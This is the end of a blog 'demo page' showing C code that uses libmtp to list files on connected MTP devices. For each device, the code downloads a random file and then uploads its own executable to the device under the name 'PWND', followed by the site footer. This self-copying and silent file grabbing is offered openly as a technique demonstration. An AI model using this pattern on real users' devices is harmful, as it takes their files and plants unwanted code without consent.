</span><span id="row-151"><span class="lineno">151 </span>        <span class="k">if</span> <span class="p">(</span><span class="n">nmem</span><span class="p">)</span>
</span><span id="row-152"><span class="lineno">152 </span>                <span class="n">free</span><span class="p">(</span><span class="n">fl</span><span class="p">);</span>
</span><span id="row-153"><span class="lineno">153 </span>        <span class="o">*</span><span class="n">flist</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span id="row-154"><span class="lineno">154 </span><span class="p">}</span>
</span><span id="row-155"><span class="lineno">155 </span>
</span><span id="row-156"><span class="lineno">156 </span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span id="row-157"><span class="lineno">157 </span><span class="p">{</span>
</span><span id="row-158"><span class="lineno">158 </span>        <span class="kt">char</span> <span class="o">*</span><span class="n">fname</span><span class="p">;</span>
</span><span id="row-159"><span class="lineno">159 </span>        <span class="kt">ssize_t</span> <span class="n">idx</span><span class="p">;</span>
</span><span id="row-160"><span class="lineno">160 </span>        <span class="kt">size_t</span> <span class="n">fcount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">reals</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
</span><span id="row-161"><span class="lineno">161 </span>        <span class="kt">char</span> <span class="o">**</span><span class="n">flist</span><span class="p">;</span>
</span><span id="row-162"><span class="lineno">162 </span>        <span class="n">LIBMTP_mtpdevice_t</span> <span class="o">*</span><span class="n">device_list</span><span class="p">,</span> <span class="o">*</span><span class="n">device</span><span class="p">;</span>
</span><span id="row-163"><span class="lineno">163 </span>        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="o">*</span><span class="n">f2</span><span class="p">;</span>
</span><span id="row-164"><span class="lineno">164 </span>        <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">;</span>
</span><span id="row-165"><span class="lineno">165 </span>        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">newfile</span><span class="p">;</span>
</span><span id="row-166"><span class="lineno">166 </span>
</span><span id="row-167"><span class="lineno">167 </span>        <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span id="row-168"><span class="lineno">168 </span>        <span class="n">LIBMTP_Init</span><span class="p">();</span>
</span><span id="row-169"><span class="lineno">169 </span>
</span><span id="row-170"><span class="lineno">170 </span>        <span class="k">switch</span> <span class="p">(</span><span class="n">LIBMTP_Get_Connected_Devices</span><span class="p">(</span><span class="o">&amp;</span><span class="n">device_list</span><span class="p">))</span> <span class="p">{</span>
</span><span id="row-171"><span class="lineno">171 </span>        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_NONE</span><span class="p">:</span>
</span><span id="row-172"><span class="lineno">172 </span>                <span class="k">break</span><span class="p">;</span>
</span><span id="row-173"><span class="lineno">173 </span>        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_NO_DEVICE_ATTACHED</span><span class="p">:</span>
</span><span id="row-174"><span class="lineno">174 </span>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s: no devices found</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span id="row-175"><span class="lineno">175 </span>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-176"><span class="lineno">176 </span>        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_CONNECTING</span><span class="p">:</span>
</span><span id="row-177"><span class="lineno">177 </span>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span>
</span><span id="row-178"><span class="lineno">178 </span>                        <span class="s">"%s: There has been an error connecting</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
</span><span id="row-179"><span class="lineno">179 </span>                        <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span id="row-180"><span class="lineno">180 </span>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span id="row-181"><span class="lineno">181 </span>        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_MEMORY_ALLOCATION</span><span class="p">:</span>
</span><span id="row-182"><span class="lineno">182 </span>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s: Memory Allocation Error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span id="row-183"><span class="lineno">183 </span>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span id="row-184"><span class="lineno">184 </span>        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_GENERAL</span><span class="p">:</span>
</span><span id="row-185"><span class="lineno">185 </span>        <span class="k">default</span><span class="o">:</span>
</span><span id="row-186"><span class="lineno">186 </span>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s: Unknown error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span id="row-187"><span class="lineno">187 </span>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span id="row-188"><span class="lineno">188 </span>        <span class="p">}</span>
</span><span id="row-189"><span class="lineno">189 </span>
</span><span id="row-190"><span class="lineno">190 </span>        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Files list:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</span><span id="row-191"><span class="lineno">191 </span>        <span class="k">for</span> <span class="p">(</span><span class="n">device</span> <span class="o">=</span> <span class="n">device_list</span><span class="p">;</span> <span class="n">device</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">device</span> <span class="o">=</span> <span class="n">device</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-192"><span class="lineno">192 </span>                <span class="n">fname</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Friendlyname</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
</span><span id="row-193"><span class="lineno">193 </span>                <span class="k">if</span> <span class="p">(</span><span class="n">fname</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span id="row-194"><span class="lineno">194 </span>                        <span class="n">fname</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"NONAME"</span><span class="p">);</span>
</span><span id="row-195"><span class="lineno">195 </span>                <span class="n">folders</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Folder_List</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
</span><span id="row-196"><span class="lineno">196 </span>                <span class="n">files</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Filelisting_With_Callback</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
</span><span id="row-197"><span class="lineno">197 </span>                                                             <span class="nb">NULL</span><span class="p">,</span>
</span><span id="row-198"><span class="lineno">198 </span>                                                             <span class="nb">NULL</span><span class="p">);</span>
</span><span id="row-199"><span class="lineno">199 </span>                <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">files</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-200"><span class="lineno">200 </span>                        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Nothing to see here.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</span><span id="row-201"><span class="lineno">201 </span>                        <span class="n">LIBMTP_Dump_Errorstack</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
</span><span id="row-202"><span class="lineno">202 </span>                        <span class="n">LIBMTP_Clear_Errorstack</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
</span><span id="row-203"><span class="lineno">203 </span>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="row-204"><span class="lineno">204 </span>                        <span class="n">fcount</span> <span class="o">=</span> <span class="n">approx_count</span><span class="p">(</span><span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="p">);</span>
</span><span id="row-205"><span class="lineno">205 </span>                        <span class="n">flist</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">fcount</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">));</span>
</span><span id="row-206"><span class="lineno">206 </span>                        <span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span id="row-207"><span class="lineno">207 </span>                        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">fcount</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span id="row-208"><span class="lineno">208 </span>                        <span class="n">reals</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-209"><span class="lineno">209 </span>                        <span class="k">while</span> <span class="p">(</span><span class="n">reals</span> <span class="o">&lt;</span> <span class="n">fcount</span><span class="p">)</span>
</span><span id="row-210"><span class="lineno">210 </span>                                <span class="k">if</span> <span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">reals</span><span class="p">])</span>
</span><span id="row-211"><span class="lineno">211 </span>                                        <span class="o">++</span><span class="n">reals</span><span class="p">;</span>
</span><span id="row-212"><span class="lineno">212 </span>                                <span class="k">else</span>
</span><span id="row-213"><span class="lineno">213 </span>                                        <span class="k">break</span><span class="p">;</span>
</span><span id="row-214"><span class="lineno">214 </span>                        <span class="n">qsort</span><span class="p">(</span><span class="n">flist</span><span class="p">,</span> <span class="n">reals</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">),</span> <span class="n">pathcmp</span><span class="p">);</span>
</span><span id="row-215"><span class="lineno">215 </span>                        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reals</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span id="row-216"><span class="lineno">216 </span>                                <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span id="row-217"><span class="lineno">217 </span>                        <span class="n">reals</span> <span class="o">=</span> <span class="n">files_count</span><span class="p">(</span><span class="n">files</span><span class="p">);</span>
</span><span id="row-218"><span class="lineno">218 </span>                        <span class="n">reals</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="n">reals</span><span class="p">;</span>
</span><span id="row-219"><span class="lineno">219 </span>                        <span class="n">f2</span> <span class="o">=</span> <span class="n">files</span><span class="p">;</span>
</span><span id="row-220"><span class="lineno">220 </span>                        <span class="k">while</span> <span class="p">(</span><span class="n">f2</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">reals</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-221"><span class="lineno">221 </span>                                <span class="n">f2</span> <span class="o">=</span> <span class="n">f2</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span><span id="row-222"><span class="lineno">222 </span>                                <span class="o">--</span><span class="n">reals</span><span class="p">;</span>
</span><span id="row-223"><span class="lineno">223 </span>                        <span class="p">}</span>
</span><span id="row-224"><span class="lineno">224 </span>                        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span id="row-225"><span class="lineno">225 </span>                                <span class="k">if</span> <span class="p">(</span><span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span>
</span><span id="row-226"><span class="lineno">226 </span>                                        <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'_'</span><span class="p">;</span>
</span><span id="row-227"><span class="lineno">227 </span>                        <span class="k">if</span> <span class="p">(</span><span class="n">LIBMTP_Get_File_To_File</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
</span><span id="row-228"><span class="lineno">228 </span>                                                    <span class="n">f2</span><span class="o">-&gt;</span><span class="n">item_id</span><span class="p">,</span>
</span><span id="row-229"><span class="lineno">229 </span>                                                    <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span>
</span><span id="row-230"><span class="lineno">230 </span>                                                    <span class="nb">NULL</span><span class="p">,</span>
</span><span id="row-231"><span class="lineno">231 </span>                                                    <span class="nb">NULL</span><span class="p">))</span>
</span><span id="row-232"><span class="lineno">232 </span>                                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Error getting file.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</span><span id="row-233"><span class="lineno">233 </span>                        <span class="k">else</span>
</span><span id="row-234"><span class="lineno">234 </span>                                <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Downloaded file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
</span><span id="row-235"><span class="lineno">235 </span>                                       <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
</span><span id="row-236"><span class="lineno">236 </span>                        <span class="n">newfile</span> <span class="o">=</span> <span class="n">LIBMTP_new_file_t</span><span class="p">();</span>
</span><span id="row-237"><span class="lineno">237 </span>                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"PWND"</span><span class="p">);</span>
</span><span id="row-238"><span class="lineno">238 </span>                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filesize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-239"><span class="lineno">239 </span>                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filetype</span> <span class="o">=</span> <span class="n">LIBMTP_FILETYPE_UNKNOWN</span><span class="p">;</span>
</span><span id="row-240"><span class="lineno">240 </span>                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">storage_id</span> <span class="o">=</span> <span class="n">f2</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">;</span>
</span><span id="row-241"><span class="lineno">241 </span>                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-242"><span class="lineno">242 </span>                        <span class="k">if</span> <span class="p">(</span><span class="n">LIBMTP_Send_File_From_File</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
</span><span id="row-243"><span class="lineno">243 </span>                                                       <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
</span><span id="row-244"><span class="lineno">244 </span>                                                       <span class="n">newfile</span><span class="p">,</span>
</span><span id="row-245"><span class="lineno">245 </span>                                                       <span class="nb">NULL</span><span class="p">,</span>
</span><span id="row-246"><span class="lineno">246 </span>                                                       <span class="nb">NULL</span><span class="p">))</span>
</span><span id="row-247"><span class="lineno">247 </span>                                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Error sending file.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</span><span id="row-248"><span class="lineno">248 </span>                        <span class="k">else</span>
</span><span id="row-249"><span class="lineno">249 </span>                                <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Uploaded file PWND on storage %x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
</span><span id="row-250"><span class="lineno">250 </span>                                       <span class="n">f2</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">);</span>
</span><span id="row-251"><span class="lineno">251 </span>                        <span class="n">LIBMTP_destroy_file_t</span><span class="p">(</span><span class="n">newfile</span><span class="p">);</span>
</span><span id="row-252"><span class="lineno">252 </span>                <span class="p">}</span>
</span><span id="row-253"><span class="lineno">253 </span>                <span class="n">destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">folders</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flist</span><span class="p">,</span> <span class="n">fcount</span><span class="p">);</span>
</span><span id="row-254"><span class="lineno">254 </span>        <span class="p">}</span>
</span><span id="row-255"><span class="lineno">255 </span>
</span><span id="row-256"><span class="lineno">256 </span>        <span class="n">LIBMTP_Release_Device_List</span><span class="p">(</span><span class="n">device_list</span><span class="p">);</span>
</span><span id="row-257"><span class="lineno">257 </span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-258"><span class="lineno">258 </span><span class="p">}</span>
</span></pre></div>

    </div>
    <div class="divider"></div>
    <div class="article-details card-lower-corners">
      <div class="row">
        <div class="col l4 m4 s12">
          <div class="chip"><i class="black-text fa fa-folder fa-lg vertical-align-middle"></i>
            <a href="https://derez.github.io/category/demo-page.html"> demo page</a>
          </div>
        </div>
        <div class="col l8 m8 s12">
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/python.html"> python</a>
          </div>
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/c.html"> C</a>
          </div>
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/techniques.html"> techniques</a>
          </div>
        </div>
      </div>
      <div class="row">
        <div class="col s12">
          <span id="generated">Static site generated by <a href="https://getpelican.com">Pelican</a> in 
          <a href="https://www.python.org">Python</a> using <a href="https://jinja.pocoo.org">Jinja2.</a></span>

          <span id="copyright">&copy; Copyright 2018
            &nbsp;Danny Walker
          </span>
        </div>
      </div>
    </div>

  </article>
        </div>
      </div>
    </main>

    <script src="https://derez.github.io/theme/vendor/jquery/jquery.min.js"></script>
    <script src="https://derez.github.io/theme/vendor/materialize/js/materialize.min.js"></script>

      <script src="https://derez.github.io/theme/js/current.js?ccf8b503"></script>
  </body>
</html>